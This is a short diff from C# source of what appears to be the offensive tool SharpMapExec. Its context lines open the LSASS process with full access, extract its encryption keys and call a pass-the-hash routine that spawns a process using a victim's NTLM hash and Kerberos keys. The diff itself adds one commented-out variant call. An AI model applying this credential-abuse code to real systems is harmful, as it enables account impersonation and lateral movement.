@@ -138,6 +138,7 @@ namespace SharpMapExec.Helpers
             hProcess = Natives.OpenProcess(Natives.ProcessAccessFlags.All, false, plsass.Id);
             Keys keys = new Keys(hProcess, lsasrv, osHelper);
             Pth.CreateProcess(hProcess, lsasrv, kerberos, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), user, domain, ntlmHash, aes128, aes256, rc4, binary, arguments, luid, true);
+            //Ptp.CreateProcess(hProcess, lsasrv, kerberos, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), user, domain, ntlmHash, aes128, aes256, rc4, binary, arguments, luid, false);
         }
 
         public static string AskTicket(string user, string domain, string hash, KERB_ETYPE encType, string dc)
